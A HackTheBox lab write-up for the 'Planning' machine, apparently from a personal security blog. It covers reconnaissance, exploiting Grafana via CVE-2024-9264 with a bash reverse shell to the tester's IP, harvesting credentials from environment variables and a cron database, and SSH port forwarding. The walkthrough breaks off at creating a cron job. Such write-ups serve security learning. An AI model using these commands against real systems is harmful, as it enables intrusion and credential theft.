---
layout: page
title: Planning
description: Active challenge – details withheld per TOS
img: 
importance: 4
category: HackTheBox
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/planning/logo.png" title="HTB Planning Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Planning">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Welcome back!  In this write-up, I am planning on tackling the box, Planning.  Here we go!

First up, run the nmap to try to identify some juicy services.

{% capture nmap %}
┌──(kali㉿kali)-[~/Documents/htb/planning]
└─$ sudo nmap -sV -sC -O -A -oN nmap 10.10.11.68
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-24 02:28 AEST
Nmap scan report for planning.htb (10.10.11.68)
Host is up (0.48s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Edukate - Online Education Website
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   385.34 ms 10.10.16.1
2   191.97 ms planning.htb (10.10.11.68)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.99 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmap %}

<br />
Run nmap against all of the ports to try and find any of those pesky hidden services.

{% capture nmapfull %}
└──╼ [★]$ nmap -sS -p- -oN nmapfull 10.10.11.68
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-23 08:30 CDT
Nmap scan report for 10.10.11.68
Host is up (0.0010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.81 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmapfull %}

<br />
Update the hosts file with the planning.htb domain so it will resolve.

{% capture catetchosts %}
└─$ cat /etc/hosts 
{% endcapture %}

{% capture etchosts %}
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.68     planning.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
{% endcapture %}

{% include terminal.html language='bash' title='bash' content=catetchosts %}

{% include codebox.html title="/etc/hosts" content=etchosts %}

<br />
Check the landing page for the web server that is running on port 80.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/planning/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Review the source code for the landing page looking for anything juicy that the developer may have left behind.

{% capture landingsource %}
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Edukate - Online Education Website</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">

    <!-- Favicon -->
    <link href="img/favicon.ico" rel="icon">

    <!-- Libraries Stylesheet -->
    <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">

    <!-- Customized Bootstrap Stylesheet -->
    <link href="css/style.css" rel="stylesheet">
    <style>
        .message {
            margin-top: 20px;
            font-size: 18px;
            color: #ffff;
        }
    </style>
</head>

<body>

<snip>

<!-- JavaScript Libraries -->
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js"></script>
    <script src="lib/easing/easing.min.js"></script>
    <script src="lib/waypoints/waypoints.min.js"></script>
    <script src="lib/counterup/counterup.min.js"></script>
    <script src="lib/owlcarousel/owl.carousel.min.js"></script>

    <!-- Template Javascript -->
    <script src="js/main.js"></script>
</body>

</html>
{% endcapture %}
{% include terminal.html language='browser' title='view-source:http://planning.htb' content=landingsource %}

<br />
Check the robots.txt file for any interesting entries.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/planning/robots.png" title="robots.txt" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run ffuf with a medium dictionary looking for any potential files or directories.

{% capture ffufmed %}
└──╼ [★]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://planning.htb/FUZZ -e .txt,.bak,.php,.html -fw 8236

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .txt .bak .php .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 8236
________________________________________________

img                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 2ms]
contact.php             [Status: 200, Size: 10632, Words: 3537, Lines: 202, Duration: 14ms]
about.php               [Status: 200, Size: 12727, Words: 4057, Lines: 231, Duration: 14ms]
detail.php              [Status: 200, Size: 13006, Words: 4092, Lines: 221, Duration: 2ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 1ms]
lib                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 1ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 1ms]
course.php              [Status: 200, Size: 10229, Words: 2975, Lines: 195, Duration: 3ms]
enroll.php              [Status: 200, Size: 7053, Words: 1360, Lines: 157, Duration: 2ms]
:: Progress: [1102800/1102800] :: Job [1/1] :: 22222 req/sec :: Duration: [0:02:04] :: Errors: 0 ::
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=ffufmed %}

<br />
Since there was nothing super interesting, try running ffuf again with a larger dictionary this time.

{% capture ffufbig %}
└──╼ [★]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://planning.htb/FUZZ -e .txt,.bak,.php,.txt -fw 8236

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Extensions       : .txt .bak .php .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 8236
________________________________________________

img                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 2ms]
about.php               [Status: 200, Size: 12727, Words: 4057, Lines: 231, Duration: 18ms]
contact.php             [Status: 200, Size: 10632, Words: 3537, Lines: 202, Duration: 19ms]
detail.php              [Status: 200, Size: 13006, Words: 4092, Lines: 221, Duration: 2ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 2ms]
lib                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 0ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 0ms]
course.php              [Status: 200, Size: 10229, Words: 2975, Lines: 195, Duration: 1ms]
enroll.php              [Status: 200, Size: 7053, Words: 1360, Lines: 157, Duration: 3ms]
:: Progress: [6369165/6369165] :: Job [1/1] :: 28571 req/sec :: Duration: [0:12:11] :: Errors: 0 ::
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=ffufbig %}

<br />
Still a no.  Try running ffuf again but this time check for an HTTP parameter.

{% capture ffufhttp %}
└──╼ [★]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u 'http://planning.htb/contact.php?FUZZ=1' -H "Host: FUZZ.planning.htb" -fw 6

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb/contact.php?FUZZ=1
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

:: Progress: [1273833/1273833] :: Job [1/1] :: 33333 req/sec :: Duration: [0:01:43] :: Errors: 0 ::
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=ffufhttp %}

<br />
Another swing and a miss.  Let's try running ffuf looking for subdomains using the top 110,000.

{% capture ffuftop %}
└──╼ [★]$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://planning.htb/ -H "Host: FUZZ.planning.htb" -fw 6

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 33333 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=ffuftop %}

<br />
Ok, no worries.  Let's try a bigger dictionary.  We will go with the jhaddix file.

{% capture ffufjhaddix %}
└──╼ [★]$ ffuf -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -u http://planning.htb/ -H "Host: FUZZ.planning.htb" -fw 6

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

 alpblog                [Status: 200, Size: 23914, Words: 8236, Lines: 421, Duration: 4ms]
grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 3ms]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=ffufjhaddix %}

<br />
Update the hosts file with the grafana subdomain that we found in the ffuf.

{% capture catsubetchosts %}
└─$ cat /etc/hosts
{% endcapture %}

{% capture etchosts %}
└─$ cat /etc/hosts              
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.68     planning.htb garfana.planning.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
{% endcapture %}

{% include terminal.html language='bash' title='bash' content=catsubetchosts %}

{% include codebox.html title="/etc/hosts" content=etchosts %}

<br />
Check the Grafana login page.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/planning/grafanalogin.png" title="Grafana Login" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
The engagement brief provided us with credentials for the pentest.

{% capture startingcreds %}
admin:0D5oT70Fq13EvB5r
{% endcapture %}
{% include codebox.html title="Starting Creds" content=startingcreds %}

<br />
Login and check the authenticated landing page for the Grafana installation.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/planning/grafanalandingpage.png" title="Grafana Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
View the source code for the Grafana landing page.

{% capture grafanasource %}
<!DOCTYPE html>
<html lang="en-US">
  <head>
    
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width" />
    <meta name="theme-color" content="#000" />

    <title>Grafana</title>

    <base href="/" />

    <link rel="icon" type="image/png" href="public/img/fav32.png" />
    <link rel="apple-touch-icon" sizes="180x180" href="public/img/apple-touch-icon.png" />
    <link rel="mask-icon" href="public/img/grafana_mask_icon.svg" color="#F05A28" />

<snip>

<script
      nonce=""
      src="public/build/app.bbd213ecba15db924b4e.js"
      type="text/javascript"
    ></script>
    

    <script nonce="">
      performance.mark('frontend_boot_js_done_time_seconds');
    </script>
  </body>
</html>
{% endcapture %}
{% include terminal.html language='browser' title='view-source:http://grafana.planning.htb' content=grafanasource %}

<br />
Check the robots.txt file to see what we have there.

{% capture grafanarobots %}
User-agent: *
Disallow: /
{% endcapture %}
{% include terminal.html language='browser' title='http://grafana.plannin.htb/robots.txt' content=grafanarobots %}

<br />
Pull the health api to get the Grafana version.

{% capture apihealth %}
{
  "commit": "83b9528bce85cf9371320f6d6e450916156da3f6",
  "database": "ok",
  "version": "11.0.0"
}
{% endcapture %}
{% include terminal.html language='json' title='/api/health' content=apihealth %}

<br />
Search Github looking for an exploit for this particular version of Grafana.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/planning/grafanacve.png" title="Grafana Exploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/nollium/CVE-2024-9264">https://github.com/nollium/CVE-2024-9264</a>

<br />
Download the exploit to the attack machine in the local working folder.

{% capture downloadexploit %}
└──╼ [★]$ wget https://raw.githubusercontent.com/nollium/CVE-2024-9264/refs/heads/main/CVE-2024-9264.py
--2025-05-23 09:23:58--  https://raw.githubusercontent.com/nollium/CVE-2024-9264/refs/heads/main/CVE-2024-9264.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5435 (5.3K) [text/plain]
Saving to: ‘CVE-2024-9264.py’

CVE-2024-9264.py                                100%[=====================================================================================================>]   5.31K  --.-KB/s    in 0s      

2025-05-23 09:23:58 (92.8 MB/s) - ‘CVE-2024-9264.py’ saved [5435/5435]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=downloadexploit %}

<br />
Download the requirements.txt file so we can install the prerequisites for the exploit.

{% capture downloadrequirements %}
└──╼ [★]$ wget https://raw.githubusercontent.com/nollium/CVE-2024-9264/refs/heads/main/requirements.txt
--2025-05-23 09:28:30--  https://raw.githubusercontent.com/nollium/CVE-2024-9264/refs/heads/main/requirements.txt
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20 [text/plain]
Saving to: ‘requirements.txt’

requirements.txt                                100%[=====================================================================================================>]      20  --.-KB/s    in 0s      

2025-05-23 09:28:31 (2.57 MB/s) - ‘requirements.txt’ saved [20/20]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=downloadrequirements %}

<br />
Install the requirements from the file using pip.

{% capture installreqs %}
└──╼ [★]$ pip install -r requirements.txt 
Defaulting to user installation because normal site-packages is not writeable
Collecting ten (from -r requirements.txt (line 1))
  Downloading ten-0.1.6-py3-none-any.whl.metadata (3.2 kB)
Collecting psycopg2-binary (from -r requirements.txt (line 2))
  Downloading psycopg2_binary-2.9.10-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.9 kB)
Collecting beautifulsoup4<5.0.0,>=4.12.2 (from ten->-r requirements.txt (line 1))
  Downloading beautifulsoup4-4.13.4-py3-none-any.whl.metadata (3.8 kB)
Requirement already satisfied: colorama<0.5.0,>=0.4.6 in /usr/lib/python3/dist-packages (from ten->-r requirements.txt (line 1)) (0.4.6)
Requirement already satisfied: lxml>=4.9.2 in /usr/local/lib/python3.11/dist-packages (from ten->-r requirements.txt (line 1)) (5.3.0)
Requirement already satisfied: pyyaml<7.0,>=6.0 in /usr/lib/python3/dist-packages (from ten->-r requirements.txt (line 1)) (6.0)
Requirement already satisfied: requests<3.0.0,>=2.28.2 in /usr/local/lib/python3.11/dist-packages (from ten->-r requirements.txt (line 1)) (2.32.3)
Requirement already satisfied: requests-toolbelt>=0.1.10 in /usr/lib/python3/dist-packages (from ten->-r requirements.txt (line 1)) (0.10.1)
Collecting requests-toolbelt>=0.1.10 (from ten->-r requirements.txt (line 1))
  Downloading requests_toolbelt-1.0.0-py2.py3-none-any.whl.metadata (14 kB)
Requirement already satisfied: rich<14.0.0,>=13.3.4 in /usr/local/lib/python3.11/dist-packages (from ten->-r requirements.txt (line 1)) (13.9.2)
Requirement already satisfied: soupsieve>1.2 in /usr/lib/python3/dist-packages (from beautifulsoup4<5.0.0,>=4.12.2->ten->-r requirements.txt (line 1)) (2.3.2)
Requirement already satisfied: typing-extensions>=4.0.0 in /usr/local/lib/python3.11/dist-packages (from beautifulsoup4<5.0.0,>=4.12.2->ten->-r requirements.txt (line 1)) (4.12.2)
Requirement already satisfied: charset-normalizer<4,>=2 in /usr/lib/python3/dist-packages (from requests<3.0.0,>=2.28.2->ten->-r requirements.txt (line 1)) (3.0.1)
Requirement already satisfied: idna<4,>=2.5 in /usr/lib/python3/dist-packages (from requests<3.0.0,>=2.28.2->ten->-r requirements.txt (line 1)) (3.3)
Requirement already satisfied: urllib3<3,>=1.21.1 in /usr/lib/python3/dist-packages (from requests<3.0.0,>=2.28.2->ten->-r requirements.txt (line 1)) (1.26.12)
Requirement already satisfied: certifi>=2017.4.17 in /usr/lib/python3/dist-packages (from requests<3.0.0,>=2.28.2->ten->-r requirements.txt (line 1)) (2022.9.24)
Requirement already satisfied: markdown-it-py>=2.2.0 in /usr/local/lib/python3.11/dist-packages (from rich<14.0.0,>=13.3.4->ten->-r requirements.txt (line 1)) (3.0.0)
Requirement already satisfied: pygments<3.0.0,>=2.13.0 in /usr/lib/python3/dist-packages (from rich<14.0.0,>=13.3.4->ten->-r requirements.txt (line 1)) (2.14.0)
Requirement already satisfied: mdurl~=0.1 in /usr/lib/python3/dist-packages (from markdown-it-py>=2.2.0->rich<14.0.0,>=13.3.4->ten->-r requirements.txt (line 1)) (0.1.2)
Downloading ten-0.1.6-py3-none-any.whl (53 kB)
Downloading psycopg2_binary-2.9.10-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (3.0 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 3.0/3.0 MB 45.3 MB/s eta 0:00:00
Downloading beautifulsoup4-4.13.4-py3-none-any.whl (187 kB)
Downloading requests_toolbelt-1.0.0-py2.py3-none-any.whl (54 kB)
Installing collected packages: psycopg2-binary, beautifulsoup4, requests-toolbelt, ten
ERROR: pip's dependency resolver does not currently take into account all the packages that are installed. This behaviour is the source of the following dependency conflicts.
poetry 1.3.2 requires poetry-plugin-export<2.0.0,>=1.2.0, which is not installed.
poetry 1.3.2 requires trove-classifiers>=2022.5.19, which is not installed.
poetry 1.3.2 requires dulwich<0.21.0,>=0.20.46, but you have dulwich 0.21.2 which is incompatible.
poetry 1.3.2 requires requests-toolbelt<0.11.0,>=0.9.1, but you have requests-toolbelt 1.0.0 which is incompatible.
Successfully installed beautifulsoup4-4.13.4 psycopg2-binary-2.9.10 requests-toolbelt-1.0.0 ten-0.1.6

[notice] A new release of pip is available: 25.0.1 -> 25.1.1
[notice] To update, run: python3.11 -m pip install --upgrade pip
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=installreqs %}

<br />
Start a netcat listener.

{% capture start443listener %}
└──╼ [★]$ sudo rlwrap nc -nlvp 443
listening on [any] 443 ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=start443listener %}

<br />
Run the exploit with a revshell payload.

{% capture runexploit %}
└──╼ [★]$ python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'bash -c "/bin/bash -i >& /dev/tcp/10.10.14.20/443 0>&1"' http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: bash -c "/bin/bash -i >& /dev/tcp/10.10.14.20/443 0>&1".
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runexploit %}

<br />
Check the listener and catch the shell.  Judging by the hostname, looks like we are in some kind of container.

{% capture catchshell %}
└──╼ [★]$ sudo rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.11.68] 38324
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@7ce659d667d7:~#
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=catchshell %}

<br />
Dump the envrionment variables. Notice that there are credentials for a user named enzo there.

{% capture dumpenv %}
root@7ce659d667d7:~# env
env
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
AWS_AUTH_EXTERNAL_ID=
SHLVL=2
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=dumpenv %}

<br />
Ssh into the machine using the creds from the environment variables.

{% capture sshenzo %}
└──╼ [★]$ ssh enzo@10.10.11.68
enzo@10.10.11.68's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri May 23 02:38:31 PM UTC 2025

  System load:           0.0
  Usage of /:            83.9% of 6.30GB
  Memory usage:          48%
  Swap usage:            0%
  Processes:             234
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.68
  IPv6 address for eth0: dead:beef::250:56ff:fe95:c808


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Fri May 23 14:38:32 2025 from 10.10.14.20
enzo@planning:~$
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=sshenzo %}

<br />
Run sudo -l to see if there are any commands that we can run as sudo.

{% capture sudol %}
enzo@planning:~$ sudo -l
[sudo] password for enzo: 
Sorry, user enzo may not run sudo on planning.
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=sudol %}

<br />
Check that the opt folder since this can be a common install folder and common hiding place for HTB.

{% capture lsopt %}
enzo@planning:~$ cd /opt
enzo@planning:/opt$ ls
containerd  crontabs
enzo@planning:/opt$ cd crontabs
enzo@planning:/opt/crontabs$ ls
crontab.db
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=lsopt %}

<br />
Check the crontab.db file that is the opt.

{% capture catcrontabdb %}
enzo@planning:/opt/crontabs$ cat crontab.db
{% endcapture %}

{% capture crontabdb %}
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
{% endcapture %}

{% include terminal.html language='bash' title='bash' content=catcrontabdb %}

{% include terminal.html language='json' title='crontab.db' content=crontabdb %}

<br />
Check the ss to see the listening ports.

{% capture ssantlp %}
enzo@planning:/opt$ ss -antlp
State                 Recv-Q                Send-Q                                Local Address:Port                                  Peer Address:Port                Process                
LISTEN                0                     70                                        127.0.0.1:33060                                      0.0.0.0:*                                          
LISTEN                0                     511                                         0.0.0.0:80                                         0.0.0.0:*                                          
LISTEN                0                     151                                       127.0.0.1:3306                                       0.0.0.0:*                                          
LISTEN                0                     511                                       127.0.0.1:8000                                       0.0.0.0:*                                          
LISTEN                0                     4096                                      127.0.0.1:3000                                       0.0.0.0:*                                          
LISTEN                0                     4096                                  127.0.0.53%lo:53                                         0.0.0.0:*                                          
LISTEN                0                     4096                                      127.0.0.1:46621                                      0.0.0.0:*                                          
LISTEN                0                     4096                                     127.0.0.54:53                                         0.0.0.0:*                                          
LISTEN                0                     4096                                              *:22                                               *:*  
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=ssantlp %}

<br />
Try connecting to the service listening on port 8000.

{% capture connect8000 %}
enzo@planning:/opt$ curl http://127.0.0.1:8000

enzo@planning:/opt$ nc 127.0.0.1 8000
HELP
HTTP/1.1 400 Bad Request
Connection: close

^C
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=connect8000 %}

<br />
Use ssh to port forward port 8000 so we can access it from the attack machine.

{% capture portforward %}
└──╼ [★]$ ssh -L 8000:localhost:8000 enzo@10.10.11.68
enzo@10.10.11.68's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri May 23 04:16:52 PM UTC 2025

  System load:           0.0
  Usage of /:            86.1% of 6.30GB
  Memory usage:          43%
  Swap usage:            0%
  Processes:             232
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.68
  IPv6 address for eth0: dead:beef::250:56ff:fe95:c808

  => / is using 86.1% of 6.30GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri May 23 16:16:53 2025 from 10.10.14.20
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=portforward %}

<br />
View the website on port 8000 from the local attack machine.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/planning/8000landing.png" title="Port 8000 landing" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use the credentials from the crontab.db to login to the website.

{% capture 8000creds %}
root:P4ssw0rdS0pRi0T3c
{% endcapture %}
{% include codebox.html title="Port 8000 Creds" content=8000creds %}

<br />
Check the landing page for port 8000.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/planning/login8000.png" title="Port 8000 Login" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use the program that we just logged into to create a cron job.

